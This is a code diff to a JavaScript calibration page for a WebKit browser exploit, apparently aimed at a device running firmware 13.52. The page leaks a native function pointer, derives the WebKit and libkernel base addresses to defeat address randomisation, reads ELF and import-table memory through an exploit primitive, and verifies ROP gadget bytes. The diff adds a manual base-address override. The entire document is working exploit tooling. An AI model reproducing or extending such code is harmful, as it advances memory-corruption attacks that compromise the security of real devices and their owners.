@@ -10,6 +10,7 @@ let exploit = null;
 let nativeFn = null;
 let tableOff = null;
 let calibrated = null;
+let manualBase = null;
 let raceAttempt = 0;
 let lengthMissStreak = 0;
 
@@ -92,8 +93,8 @@ function wireGroomBar() {
     }
 }
 
-let outEl, stateEl, resultEl, nativeFnEl, baseEl, expm1In;
-let btnStart, btnLite, btnWide, btnVerify, btnSetExpm1, btnVerify2, btnSetExpm12, btnProbe, btnCopy, btnClear;
+let outEl, stateEl, resultEl, nativeFnEl, baseEl, expm1In, baseIn;
+let btnStart, btnLite, btnWide, btnVerify, btnSetExpm1, btnSetBase, btnVerify2, btnSetExpm12, btnSetBase2, btnProbe, btnCopy, btnClear;
 let calBarEl;
 let scanMode = "lite";
 let scanIndex = 0;
@@ -101,6 +102,7 @@ let scanList = [];
 let verifyGadgetOk = 0;
 
 const SS_CANDIDATE = "wk-cal-candidate";
+const SS_MANUAL_BASE = "wk-manual-base";
 const SS_VSTEP = "wk-vstep";
 const SS_VGAD_OK = "wk-vgad-ok";
 const SS_LK_STEP = "wk-cal-lk-step";
@@ -139,11 +141,14 @@ function setUi() {
     setCalButton(btnWide, calReady);
     setCalButton(btnVerify, calReady);
     setCalButton(btnSetExpm1, calReady);
+    setCalButton(btnSetBase, calReady);
     setCalButton(btnVerify2, calReady);
     setCalButton(btnSetExpm12, calReady);
+    setCalButton(btnSetBase2, calReady);
     setCalButton(btnProbe, calReady);
     if (btnCopy) btnCopy.disabled = busy || !calibrated;
     if (expm1In) expm1In.disabled = busy || !(ready && nativeFn);
+    if (baseIn) baseIn.disabled = busy || !(ready && nativeFn);
     if (calBarEl) {
         calBarEl.style.display = "flex";
         if (ready && nativeFn)
@@ -208,10 +213,27 @@ function fmtMagic(m) {
 function activeDelta() {
     const typed = parseExpm1(expm1In && expm1In.value);
     if (typed > 0) return typed;
+    if (manualBase && nativeFn) {
+        const d = ptrNum(nativeFn) - ptrNum(manualBase);
+        if (d > 0) return d >>> 0;
+    }
     try {
         const c = parseInt(sessionStorage.getItem(SS_CANDIDATE) || "0", 16);
         return c > 0 ? c : 0;
     } catch (_) { return 0; }
+}
+
+function activeBase() {
+    if (manualBase) return manualBase;
+    const delta = activeDelta();
+    if (!nativeFn || !(delta > 0)) return null;
+    return baseFromDelta(nativeFn, delta);
+}
+
+function impliedExpm1FromBase(fn, base) {
+    if (!fn || !base) return 0;
+    const d = ptrNum(fn) - ptrNum(base);
+    return d > 0 ? (d >>> 0) : 0;
 }
 
 function parseAddr(str) {
@@ -313,6 +335,11 @@ function prefillSuggestedExpm1(fn, off) {
     return guess;
 }
 
+function loadNativeFnOverride() {
+    const raw = params.get("nativefn") || sessionStorage.getItem("wk-nativeFn");
+    return parseAddr(raw);
+}
+
 function tryElfOnce(p, fn, delta) {
     if (!(delta > 0)) return null;
     const base = baseFromDelta(fn, delta);
@@ -322,8 +349,8 @@ function tryElfOnce(p, fn, delta) {
     return { delta, base };
 }
 
-function loadNativeFnOverride() {
-    const raw = params.get("nativefn") || sessionStorage.getItem("wk-nativeFn");
+function loadManualBaseOverride() {
+    const raw = params.get("base") || sessionStorage.getItem(SS_MANUAL_BASE);
     return parseAddr(raw);
 }
 
@@ -331,10 +358,17 @@ function updateResultPanel() {
     if (nativeFnEl) nativeFnEl.textContent = nativeFn ? String(nativeFn) : "—";
     if (baseEl) {
         if (calibrated && calibrated.webkitBase)
-            baseEl.textContent = String(calibrated.webkitBase);
-        else if (nativeFn && expm1In && expm1In.value.trim())
-            baseEl.textContent = String(baseFromDelta(nativeFn, parseExpm1(expm1In.value)));
-        else
+            baseEl.textContent = String(calibrated.webkitBase)
+                + (manualBase ? " (manual override was used)" : "");
+        else if (manualBase)
+            baseEl.textContent = String(manualBase) + " (manual)";
+        else if (baseIn && baseIn.value.trim()) {
+            const typed = parseAddr(baseIn.value);
+            baseEl.textContent = typed ? String(typed) + " (typed — tap Set base)" : "—";
+        } else if (nativeFn && expm1In && expm1In.value.trim()) {
+            const b = baseFromDelta(nativeFn, parseExpm1(expm1In.value));
+            baseEl.textContent = b ? String(b) + " (computed)" : "—";
+        } else
             baseEl.textContent = "—";
     }
     if (resultEl) {
@@ -370,8 +404,13 @@ function checkGadgetBytes(p, base, rva, pat) {
 }
 
 function applyCalibration(delta, base, libkernelBase, gadgetOk) {
+    const useDelta = delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base);
+    if (!(useDelta > 0)) {
+        mark("CAL-FAIL", "no expm1 delta for PASTE-OFFSETS");
+        return;
+    }
     const result = {
-        delta,
+        delta: useDelta,
         webkitBase: base,
         libkernelBase: libkernelBase || null,
         elf: true,
@@ -536,7 +575,16 @@ async function runStart() {
 
         ready = true;
         logNativeFnInfo(nativeFn);
-        mark("HINT-CAL", "lite scan optional — Set expm1 needs 0 reads");
+        manualBase = loadManualBaseOverride();
+        if (manualBase) {
+            if (baseIn) baseIn.value = ptrNum(manualBase).toString(16);
+            const implied = impliedExpm1FromBase(nativeFn, manualBase);
+            if (implied > 0 && expm1In) expm1In.value = implied.toString(16);
+            mark("CAL-BASE-LOAD", "manual base=" + manualBase
+                + (implied > 0 ? " expm1=0x" + implied.toString(16) : ""));
+        }
+
+        mark("HINT-CAL", "lite scan optional — Set expm1 or Set base needs 0 reads");
         prefillSuggestedExpm1(nativeFn, tableOff);
 
         const pre = parseExpm1(params.get("expm1"));
@@ -603,6 +651,9 @@ async function runScanStep(mode) {
         } catch (_) { }
         clearVerifyProgress();
         if (expm1In) expm1In.value = hit.delta.toString(16);
+        if (baseIn && hit.base) baseIn.value = ptrNum(hit.base).toString(16);
+        manualBase = null;
+        try { sessionStorage.removeItem(SS_MANUAL_BASE); } catch (_) { }
         updateResultPanel();
 
         mark("CAL-ELF-HIT", "expm1=0x" + hit.delta.toString(16) + " base=" + hit.base);
@@ -623,9 +674,12 @@ function runSetExpm1() {
         state("invalid expm1", "bad");
         return;
     }
+    manualBase = null;
+    try { sessionStorage.removeItem(SS_MANUAL_BASE); } catch (_) { }
     const base = nativeFn.sub32(delta);
     const base2 = baseFromDelta(nativeFn, delta);
     try { sessionStorage.setItem(SS_CANDIDATE, String(delta)); } catch (_) { }
+    if (baseIn && base2) baseIn.value = ptrNum(base2).toString(16);
     clearVerifyProgress();
     updateResultPanel();
     mark("CAL-SET", "expm1=0x" + delta.toString(16) + " base=" + base2 + " (0 reads)");
@@ -633,6 +687,39 @@ function runSetExpm1() {
         mark("CAL-NOTE", "sub32 base=" + base + " ptr base=" + base2);
     mark("HINT", "tap Probe ELF if Verify step 1 fails on this delta");
     state("expm1 set (0 reads)", "ok");
+}
+
+function runSetBase() {
+    if (busy || !ready || !nativeFn) return;
+    preCalTrim();
+    const base = parseAddr(baseIn && baseIn.value);
+    if (!base) {
+        mark("CAL-FAIL", "bad base hex — use e.g. 8325b0000 or 0x8325b0000");
+        state("invalid base", "bad");
+        return;
+    }
+    if (!alignedWebkitBase(base)) {
+        mark("CAL-WARN", "base=" + base + " not 0x4000-aligned — verify anyway");
+    }
+    manualBase = base;
+    try {
+        sessionStorage.setItem(SS_MANUAL_BASE, String(base));
+    } catch (_) { }
+
+    const delta = impliedExpm1FromBase(nativeFn, base);
+    if (delta > 0) {
+        try { sessionStorage.setItem(SS_CANDIDATE, delta.toString(16)); } catch (_) { }
+        if (expm1In) expm1In.value = delta.toString(16);
+        mark("CAL-IMPLIED", "expm1=0x" + delta.toString(16) + " (= nativeFn − base)");
+    } else {
+        mark("CAL-WARN", "could not derive expm1 from nativeFn − base");
+    }
+
+    clearVerifyProgress();
+    updateResultPanel();
+    mark("CAL-SET-BASE", "base=" + base + " (manual, 0 reads)");
+    mark("HINT", "tap Verify step — uses manual base, not expm1 math");
+    state("base set (0 reads)", "ok");
 }
 
 async function runProbeElf() {
@@ -685,6 +772,9 @@ async function runProbeElf() {
             sessionStorage.removeItem(SS_PROBE_LIST);
         } catch (_) { }
         if (expm1In) expm1In.value = delta.toString(16);
+        if (baseIn && base) baseIn.value = ptrNum(base).toString(16);
+        manualBase = null;
+        try { sessionStorage.removeItem(SS_MANUAL_BASE); } catch (_) { }
         try { sessionStorage.setItem(SS_CANDIDATE, String(delta)); } catch (_) { }
         clearVerifyProgress();
         updateResultPanel();
@@ -699,32 +789,37 @@ async function runProbeElf() {
 
 async function runVerifyStep() {
     if (busy || !ready || !window.p || !nativeFn) return;
-    const delta = activeDelta();
-    if (!(delta > 0)) {
-        mark("CAL-FAIL", "no expm1 — lite scan or type hex first");
-        state("need expm1 delta", "bad");
+    const base = activeBase();
+    if (!base) {
+        mark("CAL-FAIL", "no base — type expm1 or base, then Set");
+        state("need expm1 or base", "bad");
         return;
     }
+    const delta = activeDelta();
 
     busy = true;
     setUi();
     preCalTrim();
 
     const p = window.p;
-    const base = baseFromDelta(nativeFn, delta);
-    if (!base) {
-        mark("CAL-FAIL", "bad base for expm1=0x" + delta.toString(16));
-        state("bad expm1", "bad");
+    if (manualBase)
+        mark("CAL-BASE-MODE", "manual base=" + base);
+    else if (!(delta > 0)) {
+        mark("CAL-FAIL", "no expm1 — lite scan or type hex first");
+        state("need expm1 delta", "bad");
         busy = false;
         setUi();
         return;
     }
+
     let step = 0;
     try { step = parseInt(sessionStorage.getItem(SS_VSTEP) || "0", 10) || 0; } catch (_) { }
     try { verifyGadgetOk = parseInt(sessionStorage.getItem(SS_VGAD_OK) || "0", 10) || 0; } catch (_) { }
 
     const totalSteps = 1 + GADGET_CHECKS.length + 3;
-    mark("VERIFY-STEP", (step + 1) + "/" + totalSteps + " expm1=0x" + delta.toString(16));
+    mark("VERIFY-STEP", (step + 1) + "/" + totalSteps
+        + (delta > 0 ? " expm1=0x" + delta.toString(16) : "")
+        + " base=" + base);
     state("verify " + (step + 1) + "/" + totalSteps + "…", "warn");
 
     try {
@@ -778,7 +873,8 @@ async function runVerifyStep() {
         const lkStep = step - 1 - GADGET_CHECKS.length;
         if (!tableOff.wk___imp___error || !tableOff.k__error) {
             if (verifyGadgetOk >= 6) {
-                applyCalibration(delta, base, null, verifyGadgetOk);
+                applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
+                    base, null, verifyGadgetOk);
             } else {
                 mark("CAL-FAIL", "gadgets " + verifyGadgetOk + "/" + GADGET_CHECKS.length);
             }
@@ -792,7 +888,8 @@ async function runVerifyStep() {
                 clearLkProgress();
                 mark("LK-FAIL", "IAT read failed");
                 if (verifyGadgetOk >= 6)
-                    applyCalibration(delta, base, null, verifyGadgetOk);
+                    applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
+                        base, null, verifyGadgetOk);
                 return;
             }
             try {
@@ -814,7 +911,8 @@ async function runVerifyStep() {
                 clearLkProgress();
                 mark("LK-FAIL", "lk read failed");
                 if (verifyGadgetOk >= 6)
-                    applyCalibration(delta, base, null, verifyGadgetOk);
+                    applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
+                        base, null, verifyGadgetOk);
                 return;
             }
             try {
@@ -840,7 +938,8 @@ async function runVerifyStep() {
         }
 
         if (verifyGadgetOk >= 6) {
-            applyCalibration(delta, base, lkBase, verifyGadgetOk);
+            applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
+                base, lkBase, verifyGadgetOk);
         } else {
             mark("CAL-FAIL", "gadgets " + verifyGadgetOk + "/" + GADGET_CHECKS.length + " (need ≥6)");
             state("verify failed — wrong expm1?", "warn");
@@ -891,13 +990,16 @@ function init() {
     nativeFnEl = $("native-fn");
     baseEl = $("webkit-base");
     expm1In = $("expm1-in");
+    baseIn = $("base-in");
     btnStart = $("btn-start");
     btnLite = $("btn-lite");
     btnWide = $("btn-wide");
     btnVerify = $("btn-verify");
     btnSetExpm1 = $("btn-set-expm1");
+    btnSetBase = $("btn-set-base");
     btnVerify2 = $("btn-verify-2");
     btnSetExpm12 = $("btn-set-expm1-2");
+    btnSetBase2 = $("btn-set-base-2");
     btnProbe = $("btn-probe");
     calBarEl = $("cal-bar");
     btnCopy = $("btn-copy");
@@ -915,6 +1017,8 @@ function init() {
     wireClick(btnVerify2, function () { return runVerifyStep(); });
     wireClick(btnSetExpm1, runSetExpm1);
     wireClick(btnSetExpm12, runSetExpm1);
+    wireClick(btnSetBase, runSetBase);
+    wireClick(btnSetBase2, runSetBase);
     wireClick(btnProbe, function () { return runProbeElf(); });
     wireClick(btnCopy, runCopy);
     wireClick(btnClear, function () {
@@ -924,6 +1028,8 @@ function init() {
 
     if (expm1In)
         expm1In.addEventListener("input", function () { updateResultPanel(); });
+    if (baseIn)
+        baseIn.addEventListener("input", function () { updateResultPanel(); });
 
     const cached = loadNativeFnOverride();
     if (cached) mark("BOOT", "cached nativeFn " + cached + " (Start refreshes live)");
@@ -931,9 +1037,18 @@ function init() {
     const pre = params.get("expm1");
     if (pre && expm1In) expm1In.value = pre.replace(/^0x/i, "");
 
+    const preBase = params.get("base");
+    if (preBase && baseIn) {
+        baseIn.value = preBase.replace(/^0x/i, "");
+        manualBase = parseAddr(preBase);
+    } else {
+        manualBase = loadManualBaseOverride();
+        if (manualBase && baseIn) baseIn.value = ptrNum(manualBase).toString(16);
+    }
+
     mark("BOOT", "index_cal.html — expm1 finder for 13.52");
     mark("BOOT", groomBootLine());
-    mark("BOOT", "lite/wide = 1 ELF read/tap; Verify step = 1 read/tap; Set expm1 = 0 reads");
+    mark("BOOT", "Set base = manual webkitBase override (?base=8325b0000)");
     wireGroomBar();
     setUi();
     state("ready — pick groom if needed, then Start", "");
